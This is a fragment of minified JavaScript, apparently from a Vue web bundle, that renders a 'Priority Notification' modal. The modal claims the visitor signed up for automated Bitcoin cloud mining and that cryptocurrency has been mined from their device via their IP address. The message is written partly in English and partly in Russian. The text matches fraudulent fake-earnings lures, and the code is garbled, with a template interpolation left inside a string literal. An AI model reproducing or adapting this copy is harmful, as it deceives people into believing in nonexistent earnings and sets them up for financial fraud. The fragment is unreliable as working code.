(function(t) {
    ...
    "16b7": function(t, e, s) {
        ...
        var a = function() {
            ...
            return a("b-modal", {
            ...
            }, [t._v("Priority Notification")])])]), a("p", [a("b", {
                ...
                staticClass: "text-numbers"
            }, [t._v("This notice is to inform you that t._s(t.penultDayYear))],  days have passed since you registered for our automated Bitcoin cloud mining service and linked your devices to our platform via your IP address.")]), a("p", [t._v("Вы не проявляли активность в вашем личном кабинете, но сбор криптовалюты происходил автоматически с Вашего устройства.")]), a("div", {
                staticClass: "d-flex position-relative"
            }, [a("img", {
                staticClass: "lazyload my-auto d-none d-sm-block",
                attrs: {
